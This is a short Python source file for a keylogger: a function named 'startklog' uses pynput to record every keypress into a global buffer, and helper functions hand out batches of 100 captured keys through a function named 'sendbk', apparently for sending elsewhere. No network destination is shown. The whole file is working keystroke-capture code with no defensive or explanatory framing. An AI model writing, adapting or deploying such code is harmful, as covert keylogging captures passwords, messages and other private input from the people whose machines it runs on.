from pynput.keyboard import Key, Listener
def startklog():
    global bufferkeys,perevery
    helpers.setperevery(100)
    bufferkeys = []
    def on_press(key):
        global bufferkeys
        try:
            try:
                bufferkeys.append(str(key.name.upper()))
            except:
                bufferkeys.append(str(key.value))
        except:
            try:
                bufferkeys.append(str(key.value.char))
            except:
                bufferkeys.append(str(key)[1:-1])
    with Listener(on_press=on_press) as listener:
        listener.join()


class helpers:
    def lenofbufferkeys():
        global bufferkeys
        return len(bufferkeys)
    def pereverynum():
        global perevery
        return perevery
    def sendbk():
        global perevery,bufferkeys
        tosend = []
        pereverythis = helpers.pereverynum()
        for i in range(pereverythis):
            tosend.append(bufferkeys.pop(0))
        return tosend
    def setperevery(amount):
        global perevery
        perevery = amount
